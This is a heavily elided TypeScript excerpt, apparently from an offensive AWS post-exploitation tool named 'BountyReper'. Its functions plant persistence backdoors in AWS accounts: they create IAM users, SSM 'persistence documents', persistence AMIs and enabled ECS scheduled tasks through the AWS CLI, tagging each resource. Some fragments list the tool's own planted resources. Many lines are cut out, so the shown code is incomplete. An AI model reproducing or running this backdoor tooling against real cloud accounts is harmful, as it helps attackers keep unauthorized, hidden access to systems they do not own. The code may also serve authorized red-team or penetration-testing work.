...
export async function iamBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  const createUser = await aws(
    ["iam", "create-user", "--user-name", username, "--tags", "Key=CreatedBy,Value=BountyReper"],
    profile,
    region,
    timeout,
  )
...
export async function ssmDocumentBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  const content = JSON.stringify({
    schemaVersion: "2.2",
    description: "BountyReper persistence document",
    mainSteps: [
      {
...
export async function amiBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  const create = await aws(
    [
      ...
      name,
      "--description",
      "BountyReper persistence AMI",
      "--tag-specifications",
      "ResourceType=image,Tags=[{Key=CreatedBy,Value=BountyReper}]",
    ],
    profile,
    region,
    timeout,
      ...
      for (const a of al) {
        ...
        if (String(a[2] || "").startsWith("cs-")) {
          findings.push({
            ...
            title: `BountyReper SSM association found: ${a[2]}`,
...
export async function ecsScheduledTask(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (hasFlag(args, "--list") || !cluster) {
    ...
    if (rules.exitCode === 0) {
      const rl = tryJson(rules.stdout) || []
      if (rl.length) {
        output.push(`[+] Existing BountyReper ECS scheduled rules: ${rl.length}`)
  ...
  const ruleCreate = await aws(
    [
      ...
      "ENABLED",
      "--description",
      "BountyReper ECS scheduled task",
    ],
    profile,
    region,
    timeout,
